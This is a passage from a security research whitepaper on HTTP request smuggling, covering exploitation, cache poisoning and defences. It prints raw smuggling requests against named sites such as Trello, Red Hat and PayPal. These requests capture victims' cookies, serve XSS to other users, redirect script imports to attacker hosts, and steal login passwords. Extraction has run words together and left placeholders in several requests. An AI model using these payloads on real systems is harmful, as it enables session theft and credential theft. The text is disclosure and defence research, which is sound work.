X-Forwarded-Proto:https
Service-Gateway-Account-Id:934454
Service-Gateway-Is-Newrelic-Admin:true
Content-Length:6
…
x=123GET...
HTTP/1.1200OK
{
"user":{
"account_id":934454,
"is_newrelic_admin":true
},
"current_account_id":934454
…
}
New Relic deployed a hotﬁx and diagnosed the root cause as a weakness in an F5 gateway. As far as I'm
aware there's no patch available, meaning this is still a zeroday at the time of writing.
Exploit
Breaking straight into internal APIs is great when it works, but it's rarely our only option. There's also a
wealth of different attacks we can launch against everyone browsing the target website.
To establish which attacks we can apply to other users, we need to understand what types of request we can
poison. Repeat the socket poisoning test from the 'Conﬁrm' stage, but iteratively tweak the 'victim' request
until it resembles a typical GET request. You might ﬁnd that you can only poison requests with certain
methods, paths or headers. Also, try issuing the victim request from a different IP address - in rare cases, you
may ﬁnd that you can only poison requests originating from the same IP.
Finally, check if the website uses a web cache - these can help bypass many restrictions, increase our control
over which resources get poisoned, and ultimately multiply the severity of request smuggling vulnerabilities.
Store
If the application supports editing or storing any kind of text data, exploitation is exceptionally easy. By
preﬁxing the victim's request with a crafted storage request, we can make the application save their request
and display it back to us - then steal any authentication cookies/headers. Here's an example targeting Trello,
using their proﬁle-edit endpoint:
POST/1/cardsHTTP/1.1
Host:trello.com
Transfer-Encoding:[tab]chunked
Content-Length:4
9f
PUT/1/members/1234HTTP/1.1
Host:trello.com
Content-Type:application/x-www-form-urlencoded
Content-Length:400
x=x&csrf=1234&username=testzzz&bio=cake
0
GET/HTTP/1.1
Host:trello.com
As soon as the victim's request arrived, it would end up saved on my proﬁle, exposing all their headers and
cookies:
The only major gotcha with this technique is that you'll lose any data that occurs after an '&', which makes it
hard to steal the body from form-encoded POST requests. I spent a while trying to work around this
limitation by using alternative request encodings and ultimately gave up, but I still suspect it's possible
somehow.
Data storage opportunities aren't always as obvious as this - on another site, I was able to use the 'Contact Us'
form, eventually triggering an email containing the victim's request and earning an extra $2,500.
Attack
Being able to apply an arbitrary preﬁx to other people's responses also opens up another avenue of attack -
triggering a harmful response.
There's two primary ways of using harmful responses. The simplest is to issue an 'attack' request, then wait
for someone else's request to hit the backend socket and trigger the harmful response. A trickier but more
powerful approach is to issue both the 'attack' and 'victim' requests ourselves, and hope that the harmful
response to the victim request gets saved by a web cache and served up to anyone else who hits the same
URL - web cache poisoning.
In each of the following request/response snippets, the black text is the response to the second (green)
request. The response to the ﬁrst (blue) request is omitted as it isn't relevant.
Upgrading XSS
While auditing a SaaS application, Param Miner7 spotted a parameter called SAML and Burp's scanner
conﬁrmed it was vulnerable to reﬂected XSS. Reﬂected XSS is nice by itself, but tricky to exploit at scale
because it requires user-interaction.
With request smuggling, we can make a response containing XSS get served to random people actively
browsing the website, enabling straightforward mass-exploitation. We can also gain access to authentication
headers and HTTP only cookies, potentially letting us pivot to other domains.
POST/HTTP/1.1
Host:saas-app.com
Content-Length:4
Transfer-Encoding:chunked
10
=x&cr={creative}&x=
66
POST/index.phpHTTP/1.1
Host:saas-app.com
Content-Length:200
SAML=a">POST/HTTP/1.1
Host:saas-app.com
Cookie:…
HTTP/1.1200OK
…
0
POST/HTTP/1.1
Host:saas-app.com
Cookie:…
"/>
Grasping the DOM
While looking for a vulnerability to chain with request smuggling on www.redhat.com, I found a DOM-based
open redirect which presented an interesting challenge:
GET/assets/idx?redir=//PI:EMAIL/HTTP/1.1
Host:www.redhat.com
HTTP/1.1200OK
Some JavaScript on the page was reading the 'redir' parameter from the victim browser's query string, but
how could I control it? Request smuggling gives us control over what the server thinks the query string is, but
the victim's browser's perception of the query string is simply whatever page they were trying to access.
I was able to resolve this by chaining in a server-side non-open redirect:
POST/css/style.cssHTTP/1.1
Host:www.redhat.com
Content-Type:application/x-www-form-urlencoded
Content-Length:122
Transfer-Encoding:chunked
0
POST/search?dest=../assets/idx?redir=//PI:EMAIL/HTTP/1.1
Host:www.redhat.com
Content-Length:15
x=GET/en/solutionsHTTP/1.1
Host:www.redhat.com
HTTP/1.1301Found
Location:../assets/idx?redir=//PI:EMAIL/
The victim browser would receive a 301 redirect to https://www.redhat.com/assets/x.html?
redir=//PI:EMAIL/ which would then execute the DOM-based open redirect and dump them on
evil.net
CDN Chaining
Some websites use multiple layers of reverse proxies and CDNs. This gives us extra opportunities for
desynchronization which is always appreciated, and it often also increases the severity.
One target was somehow using two layers of Akamai, and despite the servers being by the same vendor it
was possible to desynchronize them and thereby serve content from anywhere on the Akamai network on the
victim's website:
POST/cow.jpgHTTP/1.1
Host:redacted.com
Content-Type:application/x-www-form-urlencoded
Content-Length:50
Transfer-Encoding:chunked
0
GET/HTTP/1.1
Host:www.redhat.com
X:XGET...
RedHat-Wemakeopensourcetechnologiesfortheenterprise
The same concept works on SaaS providers - I was able to exploit a critical website built on a well known
SaaS platform by directing requests to a different system built on the same platform.
'Harmless' responses
Because request smuggling lets us inﬂuence the response to arbitrary requests, some ordinarily harmless
behaviours become exploitable. For example, even the humble open redirect can be used to compromise
accounts by redirecting JavaScript imports to a malicious domain.
Redirects that use the 307 code are particularly useful, as browsers that receive a 307 after issuing a POST
request will resend the POST to the new destination. This may mean you can make unwitting victims send
their plaintext passwords directly to your website.
Classic open redirects are quite common by themselves, but there's a variant which is endemic throughout the
web as it stems from a default behaviour in both Apache and IIS. It's conveniently considered to be harmless
and overlooked by pretty much everyone, as without an accompanying vulnerability like request smuggling it
is indeed useless. If you try to access a folder without a trailing slash, the server will respond with a redirect
to append the slash, using the hostname from the host header:
POST/etc/libs/xyz.jsHTTP/1.1
Host:redacted
Content-Length:57
Transfer-Encoding:chunked
0
POST/etcHTTP/1.1
Host:burpcollaborator.net
X:XGET/etc/libs/xyz.jsHTTP/1.1
HTTP/1.1301MovedPermanently
Location:https://burpcollaborator.net/etc/
When using this technique, keep a close eye on the protocol used in the redirect. You may be able to inﬂuence
it using a header like X-Forwarded-SSL. If it's stuck on HTTP, and you're attacking a HTTPS site, the
victim's browser will block the connection thanks to its mixed-content protection. There are two known
exceptions8 to this - Internet Explorer's mixed-content protection can be completely bypassed, and Safari will
auto-upgrade the connection to HTTPS if the redirection target is in its HSTS cache.
Web Cache Poisoning
A few hours after trying some redirect based attacks on a particular website, I opened their homepage in a
browser to look for more attack surface and spotted the following error in the dev console:
This error occurred regardless of which machine I loaded the website from, and the IP address looked awfully
familiar. During my redirect probe, someone else's request for an image ﬁle had slipped in before my victim
request and the poisoned response had been saved by the cache.
This was a great demonstration of the potential impact, but overall not an ideal outcome. Aside from relying
on timeout-based detection, there's no way to fully eliminate the possibility of accidental cache poisoning.
That said, to minimise the risk you can:
- Ensure the 'victim' requests have a cachebuster.
- Send the 'victim' requests as fast as possible, using Turbo Intruder.
- Try to craft a preﬁx that triggers a response with anti-caching headers, or a status code that's unlikely to be
cached.
- Target a front-end in a geographic region that's asleep.
Web Cache Deception++
What if instead of trying to mitigate the chance of attacker/user hybrid responses getting cached, we embrace
it?
Instead of using a preﬁx designed to cause a harmful response, we could try to fetch a response containing
sensitive information, with our victim's cookies:
POST/HTTP/1.1
Transfer-Encoding:blah
0
GET/account/settingsHTTP/1.1
X:XGET/static/site.jsHTTP/1.1
Cookie:sessionid=xyz
Frontend perspective:
GET/static/site.jsHTTP/1.1
HTTP/1.1200OK
Yourpaymenthistory
…
When a user's request for a static resource hits the poisoned socket, the response will contain their account
details, and the cache will save these over the static resource. We can then retrieve the account details by
loading /static/site.js from the cache.
This is effectively a new variant of the Web Cache Deception attack. It's more powerful in two key ways - it
doesn't require any user-interaction, and also doesn't require that the target site lets you play with extensions.
The only catch is that the attacker can't be sure where the victim's response will land.
PayPal
With request smuggling chained to cache poisoning I was able to persistently hijack numerous JavaScript
ﬁles, and among those was one used on PayPal's login page:
https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js.
POST/webstatic/r/fb/fb-all-prod.pp2.min.jsHTTP/1.1
Host:c.paypal.com
Content-Length:61
Transfer-Encoding:chunked
0
GET/webstaticHTTP/1.1
Host:skeletonscribe.net?
X:XGET/webstatic/r/fb/fb-all-prod.pp2.min.jsHTTP/1.1
Host:c.paypal.com
Connection:close
HTTP/1.1302Found
Location:http://skeletonscribe.net?,c.paypal.com/webstatic/
However there was a problem - PayPal's login page used Content Security Policy with a `script-src` that
killed my redirect.
paypal.com/signin
c.paypal.com/fb-all.js
evil.net
CSP
This initially looked like a triumph of defence in depth. However, I noticed that the login page loads a sub-
page on c.paypal.com in a dynamically generated iframe. This sub-page didn't use CSP, and also imported
our poisoned JS ﬁle. This gave us full control over the iframe's contents, but we still couldn't read the user's
PayPal password from the parent page thanks to the Same Origin Policy.
paypal.com/signin
c.paypal.com/i
c.paypal.com/fb-all.js
evil.net
IFRAME
CSP
SOP
My colleague Gareth Heyes then discovered a page at paypal.com/us/gifts that didn't use CSP, and also
imported our poisoned JS ﬁle. By using our JS to redirect the c.paypal.com iframe to that URL (and
triggering our JS import for the third time) we could ﬁnally access the parent and steal plaintext PayPal
passwords from everyone who logged in using Safari or IE.
paypal.com/signin
c.paypal.com/i
c.paypal.com/fb-all.js
evil.net
IFRAME
PAS
SW
OR
D
:)
CSP
SOP
paypal.com/us/gifts
PayPal speedily resolved this vulnerability by conﬁguring Akamai to reject requests that contained a
Transfer-Encoding:chunked header, and awarded a $18,900 bounty.
Weeks later while inventing and testing some new desynchronisation techniques, I decided to try using a line-
wrapped header:
Transfer-Encoding:
chunked
This seemed to make the Transfer-Encoding header completely invisible to Akamai, who let it through and
once again granted me control of PayPal's login page. PayPal speedily applied a more robust ﬁx, and awarded
an impressive $20,000.
Demo
Another target used a chain of reverse proxies, one of which didn't regard '\n' as a valid header terminator.
This meant a sizeable portion their web infrastructure was vulnerable to request smuggling. I've recorded a
demo showing how Desynchronize can be used to efﬁciently identify and exploit thsi vulnerability on a
replica of their Bugzilla installation, which held some extremely sensitive information.
You can ﬁnd the video in the online edition of this whitepaper at https://portswigger.net/blog/http-desync-
attacks9.
Defence
Whenever I discuss an attack technique I get asked if HTTPS prevents it. As always, the answer is 'no'. That
said, your website should be safe if you exclusively use HTTP/2 between the front-end and all backends.
As usual, security accompanies simplicity. If your website is free of load balancers, CDNs and reverse
proxies, this technique is not a threat. The more layers you introduce, the more likely you are to be
vulnerable.
Another approach is to have the front-end normalise poorly formed requests before routing them onward.
Cloudﬂare and Fastly both apply this approach, and I wasn't able to exploit request smuggling on a single
target hosted on either platform.
Normalising requests is not an option for back-end servers - they need to outright reject ambiguous requests,
and drop the associated connection.
Effective defence is impossible when your tooling works against you. Most web testing tools will
automatically 'correct' the Content Length header when sending requests, making request smuggling
impossible. In Burp Suite you can disable this behaviour using the Repeater menu - ensure your tool of
choice has equivalent functionality. Also, certain companies and bug bounty platforms route their testers'
trafﬁc through proxies like Squid for monitoring purposes. These will mangle any request smuggling attacks
the testers launch, ensuring the company gets zero coverage against this vulnerability class.
Conclusion
Building on research that has been overlooked for years, I've introduced new techniques to desynchronize
servers and demonstrated novel ways to exploit the results using numerous real websites as case studies.
Through this I've shown that request smuggling is a major threat to the web, that HTTP request parsing is a
security-critical function, and that tolerating ambiguous messages is dangerous. I've also released a
methodology and an open source toolkit to help people audit for request smuggling, prove the impact, and
earn bounties with minimal risk.
This topic is still under-researched, and as such I hope this publication will help inspire new
desynchronization techniques and exploits over the next few years.
References
1. https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
2. https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack
3. https://tools.ietf.org/html/rfc2616#section-4.4
4. https://regilero.github.io/tag/Smuggling/
5. https://github.com/portswigger/desynchronize
6. https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface
7. https://github.com/PortSwigger/param-miner
8. https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning
9. https://portswigger.net/blog/http-desync-attacks